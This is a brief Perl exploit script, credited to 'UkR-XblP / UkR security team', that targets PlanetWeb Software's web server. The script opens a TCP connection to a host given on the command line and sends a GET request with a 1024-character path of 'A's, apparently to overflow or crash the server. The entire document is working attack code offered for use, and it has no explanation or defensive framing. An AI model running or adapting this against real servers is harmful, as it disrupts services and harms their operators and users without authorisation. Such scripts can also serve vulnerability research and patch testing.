#!/usr/bin/perl
# PlanetWeb Software perl exploit
# by UkR-XblP / UkR security team
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 vulnurable_server
..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto     => "tcp",
                                  PeerAddr  => $host,
                                  PeerPort  => "http(80)",
                                  );
unless ($remote) { die "cannot connect to http daemon on
$host" }
$xblp = "A" x 1024;
$exploit = "GET /".$xblp." HTTP/1.0\n\n";
$remote->autoflush(1);
print $remote $exploit;
close $remote;
